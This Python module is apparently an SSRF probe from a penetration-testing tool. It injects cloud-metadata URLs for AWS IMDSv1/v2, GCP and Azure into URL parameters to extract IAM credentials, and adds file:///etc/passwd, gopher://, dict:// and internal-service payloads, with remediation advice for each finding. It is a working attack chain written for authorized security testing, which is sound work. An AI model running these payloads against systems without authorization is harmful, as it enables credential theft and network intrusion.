"""SSRF cloud-metadata pivot probe.

Full SSRF taxonomy targeting cloud metadata services. AWS IMDSv1 (legacy
GET) and IMDSv2 (PUT-token then GET), GCP `metadata.google.internal`
(requires `Metadata-Flavor: Google`), and Azure IMDS (requires
`Metadata: true`). Plus generic SSRF probes: file:// LFI, gopher://,
dict://, and internal-service reachability scans.

March 2025 saw an active EC2 IMDSv2 SSRF campaign per F5 Labs research,
where attackers chained IMDSv2 token-fetch through SSRF-vulnerable
parameters to extract IAM role credentials. This probe replicates the
full pivot chain for detection.

Detection signatures:
  - AWS metadata: `ami-id`, `instance-id`, `iam:role/`
  - AWS IAM creds leak: `AKIA[A-Z0-9]{16}` access-key-shape
  - GCP metadata: `project-id`, `service-accounts`
  - Azure metadata: `compute`, `subscriptionId`
  - File LFI: `root:x:0:` (canonical /etc/passwd shape)
  - Internal reachability: 200 on localhost service ports

Severity: CRITICAL on metadata leak or /etc/passwd. HIGH on internal-only
reachability (no creds extracted but network-pivot proven).
"""
from __future__ import annotations

import logging
import re
from typing import Any
from urllib.parse import quote

from engine.probes import ProbeContext, registry
from engine.probes.primitives import http_get

logger = logging.getLogger("pentest-ai.probes.web.ssrf_cloud_metadata")

# Parameter names that commonly accept URLs server-side.
URL_PARAM_NAMES: tuple[str, ...] = (
    "url",
    "link",
    "target",
    "callback",
    "redirect",
    "image",
    "src",
    "file",
    "fetch",
    "webhook",
    "uri",
    "u",
    "next",
    "dest",
    "destination",
    "feed",
    "host",
)

# Default endpoints to probe when the crawler returned nothing useful.
DEFAULT_PATHS: tuple[str, ...] = (
    "/api/fetch",
    "/api/proxy",
    "/proxy",
    "/fetch",
    "/api/url",
    "/api/preview",
    "/preview",
    "/api/image",
    "/avatar",
    "/api/webhook",
)

AWS_METADATA_URL = "http://169.254.169.254/latest/meta-data/"
AWS_IMDSV2_TOKEN_URL = "http://169.254.169.254/latest/api/token"
AWS_IMDSV2_CREDS_URL = (
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
)
GCP_METADATA_URL = "http://metadata.google.internal/computeMetadata/v1/"
AZURE_METADATA_URL = (
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
)

# Generic non-cloud SSRF payloads used to confirm parser permissiveness.
GENERIC_PAYLOADS: tuple[tuple[str, str], ...] = (
    ("file:///etc/passwd", "file_lfi"),
    ("gopher://127.0.0.1:6379/_INFO", "gopher_pivot"),
    ("dict://localhost:11211/stats", "dict_memcached"),
    ("http://localhost:8080/", "internal_localhost_8080"),
    ("http://127.0.0.1:9200/", "internal_elasticsearch"),
    ("http://127.0.0.1:5984/", "internal_couchdb"),
)

_AWS_SIGNS: tuple[str, ...] = ("ami-id", "instance-id", "iam:role/")
_GCP_SIGNS: tuple[str, ...] = ("project-id", "service-accounts")
_AZURE_SIGNS: tuple[str, ...] = ('"compute"', "subscriptionId")
_PASSWD_SIGN = "root:x:0:"
_AWS_ACCESS_KEY_RE = re.compile(r"AKIA[A-Z0-9]{16}")

# Network-stack error signatures that prove the server attempted an
# outbound connection to the SSRF destination. If any of these surface
# in the response body, the application is making the request server-
# side regardless of whether the target was reachable. Catches the
# critical class even when the operator can't stand up a listener:
# the bug is "the server fetches arbitrary URLs", not "we got data back".
_SSRF_ERROR_SIGNS: tuple[str, ...] = (
    # Python requests / urllib3
    "Max retries exceeded",
    "HTTPConnectionPool",
    "NewConnectionError",
    "Failed to establish a new connection",
    "ConnectionRefusedError",
    "Name or service not known",
    "getaddrinfo failed",
    # Node fetch / undici / axios
    "ECONNREFUSED",
    "ENOTFOUND",
    "EAI_AGAIN",
    "fetch failed",
    "AggregateError",
    # Go net/http
    "connection refused",
    "no such host",
    "i/o timeout",
    # PHP curl
    "Could not resolve host",
    "Connection refused",
    "couldn't connect to host",
    # Java URLConnection / OkHttp
    "java.net.ConnectException",
    "UnknownHostException",
)


def _classify_metadata_body(body: str) -> tuple[str, str] | None:
    """Return (cloud, evidence) for cloud-metadata leakage, else None."""
    if any(s in body for s in _AWS_SIGNS) or _AWS_ACCESS_KEY_RE.search(body):
        match = _AWS_ACCESS_KEY_RE.search(body)
        evidence = match.group(0) if match else next(
            s for s in _AWS_SIGNS if s in body
        )
        return "AWS", evidence
    if all(s in body for s in _GCP_SIGNS) or "metadata.google" in body:
        return "GCP", "GCP metadata response"
    if any(s in body for s in _AZURE_SIGNS):
        return "Azure", "Azure IMDS response"
    return None


def _emit_metadata(target: str, cloud: str, evidence: str) -> dict[str, Any]:
    return {
        "title": f"SSRF: {cloud} cloud-metadata leak via {target}",
        "severity": "critical",
        "category": "ssrf",
        "target": target,
        "evidence": f"{cloud} signature: {evidence[:200]}",
        "bug_class": "ssrf",
        "remediation": (
            "Block requests to link-local (169.254.0.0/16) and metadata "
            "hostnames at the egress proxy. On AWS, enforce IMDSv2 with "
            "hop-limit=1. Validate user-supplied URLs against an allowlist."
        ),
    }


def _emit_lfi(target: str) -> dict[str, Any]:
    return {
        "title": f"SSRF: file:// scheme allowed on {target}",
        "severity": "critical",
        "category": "ssrf",
        "target": target,
        "evidence": "/etc/passwd contents leaked via file:// SSRF",
        "bug_class": "ssrf",
        "remediation": (
            "Restrict allowed URL schemes to http/https. Reject file://, "
            "gopher://, dict://, and other non-web schemes server-side."
        ),
    }


def _emit_internal(target: str, scheme_label: str) -> dict[str, Any]:
    return {
        "title": f"SSRF: internal service reachable via {target} ({scheme_label})",
        "severity": "high",
        "category": "ssrf",
        "target": target,
        "evidence": f"variant={scheme_label}",
        "bug_class": "ssrf",
        "remediation": (
            "Block outbound requests to RFC1918 / loopback ranges. Use a "
            "deny-by-default egress policy on the SSRF-prone parameter."
        ),
    }


def _build_attack_url(base: str, path: str, param: str, payload: str) -> str:
    """Build attack URL with payload URL-encoded into the parameter."""
    sep = "&" if "?" in path else "?"
    encoded = quote(payload, safe="")
    if path.startswith(("http://", "https://")):
        return f"{path}{sep}{param}={encoded}"
    return f"{base.rstrip('/')}{path}{sep}{param}={encoded}"


async def _attempt_imdsv2_pivot(
    session: Any, base: str, path: str, param: str
) -> dict[str, Any] | None:
    """AWS IMDSv2 chain: fetch token via SSRF, then use it to grab creds.

    This requires the SSRF endpoint to respect a custom header AND let the
    server-side fetcher echo the response. Most do not. When it does, the
    pivot is the highest-impact variant.
    """
    token_url = _build_attack_url(base, path, param, AWS_IMDSV2_TOKEN_URL)
    status, _, body = await http_get(
        session,
        token_url,
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
    )
    if status != 200 or not body or len(body) < 8:
        return None
    # Token shape: long opaque string. If we got an AWS-shape response,
    # try the creds endpoint with the token. Sanitize the token before
    # putting it in a header: a non-AWS server may return arbitrary bytes
    # (HTML, JSON with embedded newlines, null bytes) and aiohttp will
    # raise ValueError on those. Stripping non-token chars also avoids
    # crashes on probe-on-probe responses (e.g. Juice Shop /api/Users JSON).
    raw_token = body.strip()
    safe_token = "".join(c for c in raw_token if c.isalnum() or c in "-_.=")[:256]
    if not safe_token:
        return None
    creds_url = _build_attack_url(base, path, param, AWS_IMDSV2_CREDS_URL)
    c_status, _, c_body = await http_get(
        session,
        creds_url,
        headers={"X-aws-ec2-metadata-token": safe_token},
    )
    if c_status == 200:
        classified = _classify_metadata_body(c_body)
        if classified is not None:
            cloud, evidence = classified
            return _emit_metadata(creds_url, cloud, evidence)
    return None


@registry.probe(
    name="web.ssrf_cloud_metadata",
    bug_class="ssrf",
    severity_max="critical",
    owasp="A10:2021",
    runtime_budget_s=18.0,
    tags=("anonymous", "high-roi", "cloud", "ssrf"),
    requires_auth=False,
)
async def probe_ssrf_cloud_metadata(ctx: ProbeContext) -> list[dict[str, Any]]:
    """Cloud-metadata SSRF pivot across AWS, GCP, Azure, plus generic SSRF."""
    findings: list[dict[str, Any]] = []
    seen_targets: set[str] = set()

    candidate_paths: list[str] = list(ctx.candidate_endpoints) or list(DEFAULT_PATHS)
    # Also probe any crawler-discovered paths that look URL-accepting.
    for hint in ctx.endpoint_hints:
        if hint not in candidate_paths:
            candidate_paths.append(hint)
    candidate_paths = candidate_paths[:12]

    # Per-path baseline: a request with NO malicious URL param. If the
    # attack response is identical to the baseline, the param was ignored
    # by the server and there's no SSRF — just a no-op query string.
    # Without this guard, every endpoint that happily serves 200 (e.g.
    # an authed JSON listing) gets flagged for every URL-shaped param,
    # producing 6+ false positives per discovered endpoint.
    baselines: dict[str, str] = {}
    async def _baseline(path: str) -> str:
        if path not in baselines:
            url = ctx.base.rstrip("/") + path
            _, _, body = await http_get(ctx.session, url)
            baselines[path] = body or ""
        return baselines[path]

    for path in candidate_paths:
        for param in URL_PARAM_NAMES[:6]:  # cap per-path fanout
            target_id = f"{path}?{param}"
            if target_id in seen_targets:
                continue

            # 1. AWS IMDSv1 GET
            url = _build_attack_url(ctx.base, path, param, AWS_METADATA_URL)
            status, _, body = await http_get(ctx.session, url)
            if status == 200:
                classified = _classify_metadata_body(body)
                if classified is not None:
                    cloud, evidence = classified
                    findings.append(_emit_metadata(url, cloud, evidence))
                    seen_targets.add(target_id)
                    continue

            # 2. AWS IMDSv2 PUT-token pivot
            v2_finding = await _attempt_imdsv2_pivot(
                ctx.session, ctx.base, path, param
            )
            if v2_finding is not None:
                findings.append(v2_finding)
                seen_targets.add(target_id)
                continue

            # 3. GCP probe (requires Metadata-Flavor header)
            gcp_url = _build_attack_url(ctx.base, path, param, GCP_METADATA_URL)
            status, _, body = await http_get(
                ctx.session, gcp_url, headers={"Metadata-Flavor": "Google"}
            )
            if status == 200:
                classified = _classify_metadata_body(body)
                if classified is not None:
                    cloud, evidence = classified
                    findings.append(_emit_metadata(gcp_url, cloud, evidence))
                    seen_targets.add(target_id)
                    continue

            # 4. Azure probe (requires Metadata: true header)
            azure_url = _build_attack_url(
                ctx.base, path, param, AZURE_METADATA_URL
            )
            status, _, body = await http_get(
                ctx.session, azure_url, headers={"Metadata": "true"}
            )
            if status == 200:
                classified = _classify_metadata_body(body)
                if classified is not None:
                    cloud, evidence = classified
                    findings.append(_emit_metadata(azure_url, cloud, evidence))
                    seen_targets.add(target_id)
                    continue

            # 5. Generic SSRF probes (file://, gopher://, dict://, internal,
            # self-loop, error-pattern detection on any-status response).
            # We accept status != 200 here because many SSRF endpoints
            # surface the upstream connection error in a 500/400 body —
            # the error itself proves the server attempted the fetch,
            # which is the actual bug.
            generic_payloads_with_self = list(GENERIC_PAYLOADS) + [
                (ctx.base.rstrip("/") + "/", "self_loop"),
            ]
            for payload, label in generic_payloads_with_self:
                gen_url = _build_attack_url(ctx.base, path, param, payload)
                status, _, body = await http_get(ctx.session, gen_url)
                if not body:
                    continue
                if label == "file_lfi" and _PASSWD_SIGN in body:
                    findings.append(_emit_lfi(gen_url))
                    seen_targets.add(target_id)
                    break

                # Error-pattern detection: any of the network-stack error
                # signatures in the response body confirms outbound fetch.
                err_match = next(
                    (s for s in _SSRF_ERROR_SIGNS if s in body), None,
                )
                if err_match is not None:
                    findings.append(_emit_internal(
                        gen_url, f"{label}_outbound_attempt",
                    ))
                    seen_targets.add(target_id)
                    break

                if status != 200:
                    continue

                if label.startswith("internal_") or label == "self_loop":
                    # Only fire when the response actually CHANGED relative
                    # to a no-param baseline. If the body is identical,
                    # the URL param was ignored — no SSRF happened.
                    base = await _baseline(path)
                    if body == base:
                        continue
                    # Length-only-different on a JSON list isn't a real
                    # SSRF either; require >5% size change OR at least
                    # 20 char delta. CSRF tokens / session IDs typically
                    # stay below that threshold.
                    if abs(len(body) - len(base)) <= max(20, len(base) // 20):
                        continue
                    findings.append(_emit_internal(gen_url, label))
                    seen_targets.add(target_id)
                    break

    return findings
